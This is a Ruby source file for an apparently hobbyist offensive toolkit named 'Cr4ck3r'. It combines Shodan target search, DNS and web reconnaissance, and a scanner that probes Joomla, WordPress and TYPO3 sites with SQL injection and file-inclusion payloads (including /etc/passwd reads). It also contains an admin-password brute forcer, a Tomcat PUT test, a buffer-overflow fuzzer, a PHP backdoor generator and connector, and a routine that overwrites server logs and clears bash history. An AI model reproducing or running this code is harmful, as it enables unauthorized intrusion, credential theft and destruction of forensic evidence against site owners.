#/usr/bin/ruby -w 

=begin 
       Powred By D3crypT0r (:
		       
=end
require "rest-client"
require "nokogiri"
require "colorize"
require "open-uri"
require "net/http"
require "socket"
require 'shodan'
system("cls")
puts "
        CCCCCCCCCCCCC                           444444444                      kkkkkkkk           333333333333333                       
     CCC::::::::::::C                          4::::::::4                      k::::::k          3:::::::::::::::33                     
   CC:::::::::::::::C                         4:::::::::4                      k::::::k          3::::::33333::::::3                    
  C:::::CCCCCCCC::::C                        4::::44::::4                      k::::::k          3333333     3:::::3                    
 C:::::C       CCCCCCrrrrr   rrrrrrrrr      4::::4 4::::4      cccccccccccccccc k:::::k    kkkkkkk           3:::::3rrrrr   rrrrrrrrr   
C:::::C              r::::rrr:::::::::r    4::::4  4::::4    cc:::::::::::::::c k:::::k   k:::::k            3:::::3r::::rrr:::::::::r  
C:::::C              r:::::::::::::::::r  4::::4   4::::4   c:::::::::::::::::c k:::::k  k:::::k     33333333:::::3 r:::::::::::::::::r 
C:::::C              rr::::::rrrrr::::::r4::::444444::::444c:::::::cccccc:::::c k:::::k k:::::k      3:::::::::::3  rr::::::rrrrr::::::r
C:::::C               r:::::r     r:::::r4::::::::::::::::4c::::::c     ccccccc k::::::k:::::k       33333333:::::3  r:::::r     r:::::r
C:::::C               r:::::r     rrrrrrr4444444444:::::444c:::::c              k:::::::::::k                3:::::3 r:::::r     rrrrrrr
C:::::C               r:::::r                      4::::4  c:::::c              k:::::::::::k                3:::::3 r:::::r            
 C:::::C       CCCCCC r:::::r                      4::::4  c::::::c     ccccccc k::::::k:::::k               3:::::3 r:::::r            
  C:::::CCCCCCCC::::C r:::::r                      4::::4  c:::::::cccccc:::::ck::::::k k:::::k  3333333     3:::::3 r:::::r            
   CC:::::::::::::::C r:::::r                    44::::::44 c:::::::::::::::::ck::::::k  k:::::k 3::::::33333::::::3 r:::::r            
     CCC::::::::::::C r:::::r                    4::::::::4  cc:::::::::::::::ck::::::k   k:::::k3:::::::::::::::33  r:::::r            
        CCCCCCCCCCCCC rrrrrrr                    4444444444    cccccccccccccccckkkkkkkk    kkkkkkk333333333333333    rrrrrrr            
                                                                 ".red                                                                             
puts  "
                     **Powered By D3crypT0r (🅢🅨🅔🅓 🅡🅘🅩🅦🅐🅝 🅗🅘🅛🅐🅛 🅢🅗🅐🅗)**
<Track my Target>  |  Gather information                                
                        About Targets
".green

while true do 
print " track>>> : ".red
$option = gets.chomp
if $option == "exit" then
    break
end
if $option == "help"  then

puts

puts "[site] MAKE YOUR TARGET".green
puts "[help] show this MESSAGE".green
puts "[targ] Search targets".green
puts "[exit] exit the script".green
puts "[uptd] Update Cr4ck3r".green
puts "[anon] Run Anonymous Mode".green
puts "[info] About Cr4ck3r".green
puts                  
end
if $option == "anon" then 
puts
puts "ANONSURF START **** ".green.on_blue
system("service tor start ")
system("anonsurf start")
puts "Press 99 to stop anonsurf service"
end
if $option == "99" then
system("anonsurf stop service")
end
if $option == "targ" then 
puts "[1] Search Target Shodan".blue 
puts "[2] Shodan Port Scanner".blue
end
if $option == "2" then 
print "IP :: ".green
targetportscan = gets.chomp
$sourceshodan = open("https://www.shodan.io/host/#{targetportscan}").read
f = File.open("#{targetportscan}.htm","w")
f.puts $sourceshodan
f.close
print "[+]".green
system("grep -a 'Ports open:'  #{targetportscan}.htm | cut -d '=' -f 3 | cut -d '/' -f 1")
end 
if $option == "1" then 
def bann()
puts " ""
████████╗ █████╗ ██████╗  ██████╗ ███████╗████████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝ ██╔════╝╚══██╔══╝
   ██║   ███████║██████╔╝██║  ███╗█████╗     ██║   
   ██║   ██╔══██║██╔══██╗██║   ██║██╔══╝     ██║   
   ██║   ██║  ██║██║  ██║╚██████╔╝███████╗   ██║   
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
                                                   
                                
                                            
                                           
"""
end
bann()
puts "Before you can use the Target, you need to have an API key account.shodan.io and add it to apii.txt"
apii = open("api.txt")
my_shodan_api = apii.read
print "Search : "
target = gets.chomp
api = Shodan::Shodan.new("#{my_shodan_api}")
result = api.search("#{target}")
file = File.open("result.txt","w") do |f2|
result['matches'].each{ |host|
system("clear")
bann()
puts "-------------"
puts host['ip_str']
f2.puts host['ip_str']
puts "--------------"
}
system("clear")
bann()
puts "[+] Success ! Target saved in result.txt".green
system("pause>nul")
end
end
if $option == "info" then
    puts "
You Can use this tool to Spider your website and get important information and gather information automaticaly using whatweb-host-traceroute-dig-fierce-wafw00f or to Identify the cms and to find the vulnerability in your website using Cms Exploit Scanner && WebApp Vul Scanner Also You can use killshot to Scan automaticly multiple type of scan with nmap and unicorn . And With this tool You can Generate PHP Simple Backdoors upload it manual and connect to the target using killshot
This Tool Bearing A simple Ruby Fuzzer Tested on VULSERV.exe And Linux Log clear script To change the content of login paths Spider can help you to find parametre of the site and scan xss and 
add shodan tools in the last update 
".blue
end
if $option == "uptd" then 
system("git clone https://github.com/D3crypT0r/Cr4ck3r.git")
end
if $option == "site" then
    
	print "Site : ".green
  $url = gets.chomp
	             system("cls")
	             system("clear")
puts "                                
                                                                                                                                        
                                                                                                                                        
        CCCCCCCCCCCCC                           444444444                      kkkkkkkk           333333333333333                       
     CCC::::::::::::C                          4::::::::4                      k::::::k          3:::::::::::::::33                     
   CC:::::::::::::::C                         4:::::::::4                      k::::::k          3::::::33333::::::3                    
  C:::::CCCCCCCC::::C                        4::::44::::4                      k::::::k          3333333     3:::::3                    
 C:::::C       CCCCCCrrrrr   rrrrrrrrr      4::::4 4::::4      cccccccccccccccc k:::::k    kkkkkkk           3:::::3rrrrr   rrrrrrrrr   
C:::::C              r::::rrr:::::::::r    4::::4  4::::4    cc:::::::::::::::c k:::::k   k:::::k            3:::::3r::::rrr:::::::::r  
C:::::C              r:::::::::::::::::r  4::::4   4::::4   c:::::::::::::::::c k:::::k  k:::::k     33333333:::::3 r:::::::::::::::::r 
C:::::C              rr::::::rrrrr::::::r4::::444444::::444c:::::::cccccc:::::c k:::::k k:::::k      3:::::::::::3  rr::::::rrrrr::::::r
C:::::C               r:::::r     r:::::r4::::::::::::::::4c::::::c     ccccccc k::::::k:::::k       33333333:::::3  r:::::r     r:::::r
C:::::C               r:::::r     rrrrrrr4444444444:::::444c:::::c              k:::::::::::k                3:::::3 r:::::r     rrrrrrr
C:::::C               r:::::r                      4::::4  c:::::c              k:::::::::::k                3:::::3 r:::::r            
 C:::::C       CCCCCC r:::::r                      4::::4  c::::::c     ccccccc k::::::k:::::k               3:::::3 r:::::r            
  C:::::CCCCCCCC::::C r:::::r                      4::::4  c:::::::cccccc:::::ck::::::k k:::::k  3333333     3:::::3 r:::::r            
   CC:::::::::::::::C r:::::r                    44::::::44 c:::::::::::::::::ck::::::k  k:::::k 3::::::33333::::::3 r:::::r            
     CCC::::::::::::C r:::::r                    4::::::::4  cc:::::::::::::::ck::::::k   k:::::k3:::::::::::::::33  r:::::r            
        CCCCCCCCCCCCC rrrrrrr                    4444444444    cccccccccccccccckkkkkkkk    kkkkkkk333333333333333    rrrrrrr            
                                                                                                                                                                                                                                                                     
                                                                                                                                                                     
                                                                                                    
".red
  def banner()
    puts "{0} Spider ".green  
    puts "{1} Web technologie " .green
    puts "{2} WebApp Vul Scanner" .green
    puts "{3} Port Scanner".green
    puts "{4} CMS Scanner".green
    puts "{5} Fuzzers ".green
    puts "{6} Cms Exploit Scanner ".green
    puts "{7} Backdoor Generation".green
    puts "{8} Linux Log Clear".green
    puts "{9} Find MX/NS".green
    puts 
     end
     banner()
    while true do 
    print " info>>> : ".green
    $web = gets.chomp

if $web == "9" then
$urlss= "#{$url}"
linktestermsns = $urlss.slice! "www."
puts $urlss
def mxns(s,n)
	system ("curl https://dns-api.org/#{s}/#{$urlss} >#{n}.txt")
end
mxns("MX","mx")
mxns("NS","ns")
system("cls")
puts "[+] Email Server".green
system("cat mx.txt | grep value | cut -d ':' -f 2 | cut -d '0' -f 2")
puts "[+] Name Server".green
system("cat ns.txt | grep value | cut -d ':' -f 2 ")
system("rm ns.txt && rm mx.txt")
end
class Exploitscanner
       def scanner()
        $sourcex = open("https://#{$url}").read
             
                  if  ($sourcex =~ /generator" content="TYPO3/) then 
puts  "
████████╗██╗   ██╗██████╗  ██████╗ ██████╗     ██╗    ██╗████████╗
╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔═══██╗╚════██╗    ██║    ██║╚══██╔══╝
   ██║    ╚████╔╝ ██████╔╝██║   ██║ █████╔╝    ██║ █╗ ██║   ██║   
   ██║     ╚██╔╝  ██╔═══╝ ██║   ██║ ╚═══██╗    ██║███╗██║   ██║   
   ██║      ██║   ██║     ╚██████╔╝██████╔╝    ╚███╔███╔╝   ██║   
   ╚═╝      ╚═╝   ╚═╝      ╚═════╝ ╚═════╝      ╚══╝╚══╝    ╚═╝   
                                                                  
                <https://github.com/bahaabdelwahed/>
"
$site = "http://#{$url}"
if  ($site["http"].nil?) then 
puts "USAGE <./typo3wt
http://target.com"
exit
end
def testscan(path)
uri = URI.parse("#{$site}/#{path}/")
$code = Net::HTTP.get_response(uri)
$r =  $code.code
end
testscan("typo3")
if ($r == "200") or ($r == "500")then 
print "---[+]".green
puts "Typo3 Found "
testscan("typo3/ext")
     if $code.code == "200" then 
   print "----[+]".green
   puts "ExtensionPath can be without index #{$site}/typo3/ext/"
     end 
     puts "                       [+] Extension Enumerations [+]".red
  
             ext_name = ["crawler","api_macmade","be_acl","css_select","fl_header_slide","gsi_slideshow","slideshow","twwc_pages","pw_highslide_gallery","static_info_tables","yag_themepack_jquery","formhandler","gridelements","typo3_console","cron_ptaheutetoken","cron_menustyle","be_acl","linkhandler","cron_realurlconf","typdom3","realurl","ws_flexslider","tt_address","sr_freecaps","cron_ptaheuteregistrationtoken","cron_ptaheuterezeptursubst","t3s_jslidernews","additional_reports","api_macmade","phpmyadmin","doc_indexed_search"]

                     
             ext_name.each do |ext|
                 typo3path = URI.parse("#{$site}/typo3conf/ext/#{ext}/")
                 extcode = Net::HTTP.get_response(typo3path)
                  if extcode.code == "200" then 
                    print "[+] ".green
                    puts "Found #{ext}"
                  end
             end
   puts "                          [+] Vulnrability scanner [+]".red
               puts "Weak password -Panel Brute Force".blue
user = "admin"
File.open("list.txt").each do |password| 
ah = RestClient.post "#{$site}/typo3/",{username: user,p_field: "#{password}"} do |response|
print "[+]".blue
puts "Test #{user} #{password} "
if response.code == 302
puts "Password Succes ".green
break
else 
puts "Password Woring ".red
end
end
end
 puts "Database Disclosure ".blue
  def vull(ext,path,nam,tests)
testscan("typo3conf/ext/#{ext}/")
if $code.code == "200" then
aa = open("#{$site}/#{path}").read
if aa["#{tests}"].nil?  
print "[-]".red
	puts "#{nam}"
else 
print "[+]".green
	puts "#{nam}"
	puts " --- >Download sql file "
	ff = File.new("ext_tables.sql","w+")
	
	ff.puts "#{aa}"
	ff.close
end
end
end
    puts vull("crawler","/typo3conf/ext/crawler/ext_tables.sql","Crawler Extension 6.1.2","Table structure")
sleep 1
puts vull("twwc_pages","/typo3conf/ext/twwc_pages/ext_tables.sql","twwc_pages Extension 8.7.x","Table structure")
sleep 1
puts vull("yag_themepack_jquery","/typo3conf/ext/yag_themepack_jquery/ext_tables.sql","Themepack jQuery Extension 1.3.2","Table structure")
else
	print "[-]".red
	puts "typo3 Not found"
end


 end
             
            
           if  ($sourcex =~ /generator" content="Joomla/)
                       a = 1 
                   linkk = URI("#{$url}")
                   joomla = ["/administrator/index.php","/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=","index.php?option=com_jdownloads&Itemid=0&view=upload","/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload","/index.php?option=com_foxcontact&view=foxcontact&Itemid=113","/index.php?option=com_adsmanager&task=upload&tmpl=component","/index.php?option=com_users&view=registration","/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=","/index.php?option=com_content&amp;task=blogcategory&amp;id=60&amp;Itemid=99999%20union%20select%201,concat_ws(0x3a,username,password),3,4,5%20from%20jos_users/*","mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html","/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"]
                   joomla.each do |joo|

                   
                  $joom = Net::HTTP.get_response("#{linkk}","/#{joo}")
                  
                  if ($joom.code <= "300") and (a == 1) then
                    puts " Admin panel -- > #{linkk}/#{joo}".green
                elsif ($joom.code == "200") and (a == 2) then
                  puts "[+] Com Media File Upload".green
                    puts " --> #{linkk}#{joo}".blue
                elsif ($joom.code != "200") and (a == 2) then
                    puts "[-] Com Media File Upload".red

                elsif ($joom.code == "200") and (a == 3) then
                    puts "[+] Com jdownloads File Upload".green
                    puts " --> #https://packetstormsecurity.com/files/101522/Joomla-jDownloads-1.0-Shell-Upload.html".blue
                    puts " --> #{linkk}#{joo}".blue
                elsif ($joom.code > "300") and (a == 3) then
                    puts "[-] Com jdownloads File Upload".red
                     elsif ($joom.code == "200") and (a == 4) then
                    puts "[+] Com_fabrik Upload Shell".green
                    puts " --> https://cxsecurity.com/issue/WLB-2017120085 #".blue
                elsif ($joom.code > "300") and (a == 4) then
                    puts "[-] Com_fabrik Upload Shell".red
                elsif ($joom.code == "200") and (a == 5) then
                                      puts "[+] Com foxcontact Arbitrary File Upload".green
		    puts " --> https://cxsecurity.com/issue/WLB-2016050072 #".blue
                elsif ($joom.code > "300") and (a == 5) then
                    puts "[-] Com foxcontact Arbitrary File Upload".red
                    elsif ($joom.code == "200") and (a == 6) then
                    puts "[+] Com adsmanager Arbitrary File Upload ".green
                    puts " --> https://cxsecurity.com/issue/WLB-2016050072 #".blue
                elsif ($joom.code > "300") and (a == 6) then
                    puts "[-] Com adsmanager Arbitrary File Upload".red
                elsif ($joom.code == "200") and (a == 7) then
                    puts "[+] Com User ".green
                    puts " -->  #{linkk}#{joo} #".blue
                elsif ($joom.code > "300") and (a == 7) then
                    puts "[-] Com User".red
                elsif ($joom.code == "200") and (a == 8) then
                    puts "[+] Com web links ".green
                    puts " -->  #{linkk}#{joo} #".blue
                elsif ($joom.code > "300") and (a == 8) then
                  puts "[-] Com web links ".red
                elsif ($joom.code == "200") and (a == 9) then
                    puts "[+] Com_content' Component 'ItemID' Parameter SQL Injection ".green
                    puts " --> https://www.securityfocus.com/bid/36064/exploit".blue
                    puts " --> https://www.securityfocus.com/bid/36064/exploit".blue
                elsif ($joom.code > "300") and (a == 9) then
                    puts "[-] Com_content' Component 'ItemID' Parameter SQL Injection ".red
                elsif ($joom.code == "200") and (a == 10) then
                    puts "[+] Com_content File Upload Vulnerability ".green
                    puts " -->  https://0day.today/exploit/14165".blue
                elsif ($joom.code > "300") and (a == 10) then
                    puts "[-] Com_content File Upload Vulnerability ".red
                elsif ($joom.code == "200") and (a == 11) then
                    puts "[+] COM_JCE ".green
                    puts " -->  https://cxsecurity.com/issue/WLB-2018050200".blue
                elsif ($joom.code > "300") and (a == 11) then
                    puts "[-] COM_JCE ".red
		                    end

                a = a + 1
                           end
end
 if ($sourcex =~ /generator" content="WordPress/) then
         e = 1
         wordpress = ["/readme.html","/wordpress/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd","/wp-content/plugins/wp-events-calendar/public/ajax/getEventsList.php?year=2018&month=5&day=1&calendar_id=1&pag=1","/wp-content/plugins/peugeot-music-plugin/js/plupload/examples/upload.php","/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd","wp-content/themes/WPStore/upload/index.php","wp-content/plugins/sexy-contact-form/includes/fileupload/index.php","wp-content/plugins/lazy-seo/lazyseo.php","wp-content/plugins/easy-comment-uploads/upload-form.php","wp-symposium/server/file_upload_form.php","wp-content/uploads/wp-security-audit-log/","/wp-admin/admin.php?page=powerzoomer_manage","/?gf_page=upload"]
        wordpress.each do |link|
        $linkk = URI("#{$url}")

       $xxxxxxxx = Net::HTTP.get_response("#{$linkk}","/#{link}")

       if ($xxxxxxxx.code <= "302") and  (e == 1 ) then
                  puts "Wordpress version here : #{$url}/readme.html !".green
         elsif ($xxxxxxxx.code > "300") and (e == 1 )
	 
               puts "version not found"
               
         end
            if ($xxxxxxxx.code == "200")  and (e == 2) then
                     puts "[+] WordPress Plugin Localize My Post 1.0 - Local File Inclusion Found".green
              
              elsif ($xxxxxxxx.code > "300") and (e == 2 )
puts "[-] WordPress Plugin Localize My Post 1.0 - Local File Inclusion Not Found".red
             elsif ($xxxxxxxx.code == "200") and  (e == 3 )
                puts "[+] Wordpress Plugin Events Calendar - SQL Injection ! ".green
                  puts "  --- > https://www.exploit-db.com/raw/44785/".blue
                              elsif ($xxxxxxxx.code > "300") and (e == 3 )
                    puts "[-] Wordpress Plugin Events Calendar - SQL Injection !".red
                elsif ($xxxxxxxx.code == "200") and  (e == 4 )
                puts "[+] WordPress Plugin Peugeot Music - Arbitrary File Upload ! ".green
                  puts "  --- > https://www.exploit-db.com/raw/44737/".blue
		  elsif ($xxxxxxxx.code > "300") and (e == 4 )
                    puts "[-] WordPress Plugin Peugeot Music - Arbitrary File Upload !".red
                elsif ($xxxxxxxx.code == "200") and  (e == 5 )
                puts "[+] Wordpress Plugin Site Editor 1.1.1 - Local File Inclusion ! ".green
                  puts "  --- > https://www.exploit-db.com/raw/44340/".blue
                elsif ($xxxxxxxx.code > "300") and (e == 5 )

                    puts "[-] Wordpress Plugin Site Editor 1.1.1 - Local File Inclusion".red
                  

                elsif ($xxxxxxxx.code == "200") and  (e == 6 )
                puts "[+] WordPress WPshop eCommerce Arbitrary File Upload Vulnerability ! ".green
                  puts "  --- > https://www.exploit-db.com/raw/44340/".blue
                elsif ($xxxxxxxx.code > "300") and (e == 6 )

                    puts "[-] WordPress WPshop eCommerce Arbitrary File Upload Vulnerability".red

                elsif ($xxxxxxxx.code == "200") and  (e == 7 )
                puts "[+] WordPress Plugin Creative Contact Form - Arbitrary File Upload  ! ".green
                  puts "  --- > https://www.exploit-db.com/raw/34922/".blue
                elsif ($xxxxxxxx.code > "300") and (e == 7 )

                    puts "[-] WordPress Plugin Creative Contact Form - Arbitrary File Upload ".red
                elsif ($xxxxxxxx.code == "200") and  (e == 8 )
                puts "[+] Wordpress Lazy SEO plugin Shell Upload Vulnerability  ! ".green
                  puts "  --- > https://cxsecurity.com/issue/WLB-2017080132".blue
                elsif ($xxxxxxxx.code > "300") and (e == 8 )

                                 puts "[-] Wordpress Lazy SEO plugin Shell Upload Vulnerability ".red

                elsif ($xxxxxxxx.code == "200") and  (e == 9 )
                puts "[+] Wordpress easy comment uploads   ! ".green
                  puts "  --- > https://cxsecurity.com/issue/WLB-2017080132".blue
                elsif ($xxxxxxxx.code > "300") and (e == 9 )
		
                    puts "[-] Wordpress easy comment uploads ".red
                     elsif ($xxxxxxxx.code == "200") and  (e == 10 )
                puts "[+] Wordpress WP Symposium 14.11 Shell Upload Vulnerability   ! ".green
                  puts "  --- > Metasploit exploit/unix/webapp/wp_symposium_shell_upload".blue
                elsif ($xxxxxxxx.code > "300") and (e == 10 )

                    puts "[-] Wordpress WP Symposium 14.11 Shell Upload Vulnerability ".red
                 elsif ($xxxxxxxx.code <= "300") and  (e == 11 )
                puts "[+] WordPress Plugin WP Security Audit Log 3.1.1 - SID   ! ".green
                  puts "  --- > https://www.exploit-db.com/exploits/44371/".blue
                elsif ($xxxxxxxx.code > "300") and (e == 11 )

                    puts "[-] WordPress Plugin WP Security Audit Log 3.1.1 - Sensitive Information Disclosure ".red
                elsif ($xxxxxxxx.code <= "300") and  (e == 12 )
                puts "[+] powerzoomer   ! ".green
                  puts "  --- > http://www.exploit4arab.org/exploits/399".blue
                elsif ($xxxxxxxx.code > "300") and (e == 12 )

                    puts "[-] powerzoomer ".red
                    elsif ($xxxxxxxx.code <= "300") and  (e == 12 )
                puts "[+] gravityforms   ! ".green
                  puts "  --- > https://www.exploit-db.com/exploits/39969/".blue
                elsif ($xxxxxxxx.code > "300") and (e == 12 )

                    puts "[-] powerzoomer ".red
             end
	     
e = e + 1
if e == 13 then
break
end
end
end
end
end
def domains()
print " ip For #{$url} :: ".green
$ipaddr = p Addrinfo.ip("#{$url}").ip_address
puts "Links And Paths  :: ".red
$h = Nokogiri::HTML(open("http://#{$url}").read)
puts "Related domains and Parameters ::".red
$h.xpath("//a").each do |img|
puts img['href']
end
$h = Nokogiri::HTML(open("http://#{$url}").read)
puts "IMAGE FILES  :: ".red
$h.xpath("//img").each do |img2|
puts img2['src']
end
end
def cmsscanner()

$source = open("http://#{$url}").read
if ($source =~ /generator" content="WordPress/)
    puts "#{$url} ---- > use wordpress".green
elsif ($source =~ /generator" content="Joomla/)
    puts "#{$url} ---- > use Joomla".green
elsif ($source =~ /generator" content="Drupal/)                              
    puts "#{$url} ---- > use Drupal".green
 elsif ($source =~ /generator" content="vBulletin/)
    puts "#{$url} ---- > use vBulletin".green
 elsif ($source =~ /generator" content="TYPO3/)
  else 
 puts "UNKNOW CMS !"
end
end
#------------------------        Eazy Fuzzer  For beginner Tested In VulnServer   ---------------
if $web == "5" then 
print "Ip : "
$fip = gets.chomp
print "Port : "
$fport = gets.chomp
$o = TCPSocket.open("#{$fip}",$fport) # Vuln server ip : 127.0.0.1 port : 9999 
while true do 
    $b = (1..90)
    $a = ["A"]
    $c = 100 
    for i in $b do 
        puts "Fuzzing with #{$c} bits"
        $t = $a.append("A"*$c)
        $c = $c + 100
        $o.puts("TRUN /.:/",$t) #VulnServer Test 
     end
 end
 end

                 if $web == "7" then
                        system("clear")
                     puts "{1} Generate Shell".blue
                     puts "{2} Connect Shell".blue
                     puts
                     while true do 
                           print "GENERATE >>".green
                           backdoor = gets.chomp
                           if backdoor == "1" then 
                    system("ruby bwa.rb track.php ")
                    print "track.php File Has been generated Upload it to site ( D'ont change the name) !"
                    system("pause")
                           elsif backdoor == "2"

                            puts  " Sure To Use #{$url}/track.php site y/n : "
                            
                        elsif backdoor == "y" 
                            system("ruby bwa.rb start #{$url}/track.php")
                             elsif backdoor == "n"
                                             break
                            
                                      
                            end
                     end

                     end
                    if $web == "2" then
                        
                            system("clear")
                            puts "--- ------          --------- Exploit Scanner L'ets Hack --------        ------      ".green
                            puts 
                            puts "{1} Xss scanner".blue
                            puts "{2} Sql Scanner".blue
                            puts "{3} Tomcat RCE".blue
                            print "WebApp >>".green
                            webapp = gets.chomp
                                 if webapp == "3" then 
                                 system("clear")
                            puts "--- ------          --------- APACHE TOMCAT RCE --------        ------      ".green
                            system("curl -X PUT 'http://#{$url}/test.jsp' -d 'Injected By me' ")
                            system("curl -X  GET 'http://#{$url}/test.jsp'")
                                                                  elsif webapp == "1"
                                     print "Parametre To Test :: ".green
                                      parm0 = gets.chomp 
                                      puts "this is a  automatique usage you can use the X3SCAN.rb script and add more than one website Click OK"
                                      system("pause")
                                      system("echo http://#{$url}#{parm0} > sites.txt")
                                      system("ruby RSDScan.rb sites.txt")
                                elsif webapp == "2"
                                      print "Parametre To Test :: ".green
                                      parm = gets.chomp
                                      puts "this is a  automatique usage you can use the SQLSCAN.rb script and add more than one website Click OK"
                                      system("pause")
                                      system("echo http://#{$url}#{parm} > sites.txt")
                                      system("ruby Injection.rb sites.txt")

                                      
                                    end
                                end
                   if $web == "8" then 
                    system("clear")
                    system("cls")
                    print "
                    
                                                                                                                                                           
                                                                                                                                                           
LLLLLLLLLLL                                                               CCCCCCCCCCCCC     lllllll                                                        
L:::::::::L                                                            CCC::::::::::::C     l:::::l                                                        
L:::::::::L                                                          CC:::::::::::::::C     l:::::l                                                        
LL:::::::LL                                                         C:::::CCCCCCCC::::C     l:::::l                                                        
  L:::::L                  ooooooooooo      ggggggggg   ggggg      C:::::C       CCCCCC      l::::l     eeeeeeeeeeee    aaaaaaaaaaaaa  rrrrr   rrrrrrrrr   
  L:::::L                oo:::::::::::oo   g:::::::::ggg::::g     C:::::C                    l::::l   ee::::::::::::ee  a::::::::::::a r::::rrr:::::::::r  
  L:::::L               o:::::::::::::::o g:::::::::::::::::g     C:::::C                    l::::l  e::::::eeeee:::::eeaaaaaaaaa:::::ar:::::::::::::::::r 
  L:::::L               o:::::ooooo:::::og::::::ggggg::::::gg     C:::::C                    l::::l e::::::e     e:::::e         a::::arr::::::rrrrr::::::r
  L:::::L               o::::o     o::::og:::::g     g:::::g      C:::::C                    l::::l e:::::::eeeee::::::e  aaaaaaa:::::a r:::::r     r:::::r
  L:::::L               o::::o     o::::og:::::g     g:::::g      C:::::C                    l::::l e:::::::::::::::::e aa::::::::::::a r:::::r     rrrrrrr
  L:::::L               o::::o     o::::og:::::g     g:::::g      C:::::C                    l::::l e::::::eeeeeeeeeee a::::aaaa::::::a r:::::r            
  L:::::L         LLLLLLo::::o     o::::og::::::g    g:::::g       C:::::C       CCCCCC      l::::l e:::::::e         a::::a    a:::::a r:::::r            
LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::og:::::::ggggg:::::g        C:::::CCCCCCCC::::C     l::::::le::::::::e        a::::a    a:::::a r:::::r            
L::::::::::::::::::::::Lo:::::::::::::::o g::::::::::::::::g         CC:::::::::::::::C     l::::::l e::::::::eeeeeeeea:::::aaaa::::::a r:::::r            
L::::::::::::::::::::::L oo:::::::::::oo   gg::::::::::::::g           CCC::::::::::::C     l::::::l  ee:::::::::::::e a::::::::::aa:::ar:::::r            
LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo       gggggggg::::::g              CCCCCCCCCCCCC     llllllll    eeeeeeeeeeeeee  aaaaaaaaaa  aaaarrrrrrr            
                                                     g:::::g                                                                                               
                                         gggggg      g:::::g                                                                                               
                                         g:::::gg   gg:::::g                                                                                               
                                          g::::::ggg:::::::g                                                                                               
                                           gg:::::::::::::g                                                                                                
                                             ggg::::::ggg                                                                                                  
                                                gggggg                                                                                                     
                    
"
linuxlog = [

'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/auth.log',
'/var/log/dpkg.log',
'/var/log/faillog',
'/var/log/httpd/access_log',
'/var/www/logs/access.log',
'/var/www/logs/access_log',
'/var/webmin/miniserv.log',
'/var/run/utmp',
'/var/log/yum.log',
'/var/log/xferlog',
]

                            linuxlog.each do |log|
                           if File.exist?(log) then 
                            puts "The #{log} log has been changed"
                            del = %x!echo 194.190.86.119 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 > #{log}!

                               else 
                          puts "The #{log} directry NOt found" 
                           end

                                     end

                            puts "SUPERR All log deleted YOU ARE NINJA !!!!"

                            system("PAUSE >NULL")
                            system("cls")


                            print "Clearing The Bash history "
                            system("sudo history -c && history -w")



                end
                    
                   if $web == "banner" then 

                   banner()
                   end
                   if $web == "help" then
                    puts "[ banner] Show main page".blue
                    puts "[ exit  ]   Exit  ".blue
                    puts "[ help  ] Show this message".blue
                    end
                
                    if $web == "4" then

                         cmsscanner()
                       end
                    if $web == "0" then
                        domains()
                    end
                    if $web == "6" then
                       s =  Exploitscanner.new
                       puts s.scanner()
                    end

                  

                   if $web == "exit" then
                         break
                   end
                   if $web == "1" then
  system("cls")
                         system("clear")
                         puts " [+]Basic WhatWeb Information  :: ".green
                         system("whatweb #{$url}")
                         
                         puts " [+]Host Result :: ".green
                         system("host #{$url}")
                         puts " [+]Dig Result About Dns:: ".green
                         system("dig 8.8.8.8 #{$url} | grep -e 'A' ")
                         
                         puts " [+]Trying zone transfer and Brute force :: ".green
                         system("fierce -dns #{$url} -w dns.txt")
                         puts " [+]Traceroutr Result :: ".green 
                         system("traceroute #{$url}")
                         puts " [+]Firewall And IDS Detect  :: ".green 
                         system("wafw00f #{$url}")
                   end
                   if $web == "3" then
                    system("clear")
                    system("cls")
                            puts " 
                            
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
               AAA                                     tttt                                                                             tttt            iiii                                             SSSSSSSSSSSSSSS                                                                                                                  
              A:::A                                 ttt:::t                                                                          ttt:::t           i::::i                                          SS:::::::::::::::S                                                                                                                 
             A:::::A                                t:::::t                                                                          t:::::t            iiii                                          S:::::SSSSSS::::::S                                                                                                                 
            A:::::::A                               t:::::t                                                                          t:::::t                                                          S:::::S     SSSSSSS                                                                                                                 
           A:::::::::A        uuuuuu    uuuuuuttttttt:::::ttttttt       ooooooooooo      mmmmmmm    mmmmmmm     aaaaaaaaaaaaa  ttttttt:::::ttttttt    iiiiiii    ooooooooooo   nnnn  nnnnnnnn         S:::::S                cccccccccccccccc  aaaaaaaaaaaaa  nnnn  nnnnnnnn    nnnn  nnnnnnnn        eeeeeeeeeeee    rrrrr   rrrrrrrrr   
          A:::::A:::::A       u::::u    u::::ut:::::::::::::::::t     oo:::::::::::oo  mm:::::::m  m:::::::mm   a::::::::::::a t:::::::::::::::::t    i:::::i  oo:::::::::::oo n:::nn::::::::nn       S:::::S              cc:::::::::::::::c  a::::::::::::a n:::nn::::::::nn  n:::nn::::::::nn    ee::::::::::::ee  r::::rrr:::::::::r  
         A:::::A A:::::A      u::::u    u::::ut:::::::::::::::::t    o:::::::::::::::om::::::::::mm::::::::::m  aaaaaaaaa:::::at:::::::::::::::::t     i::::i o:::::::::::::::on::::::::::::::nn       S::::SSSS          c:::::::::::::::::c  aaaaaaaaa:::::an::::::::::::::nn n::::::::::::::nn  e::::::eeeee:::::eer:::::::::::::::::r 
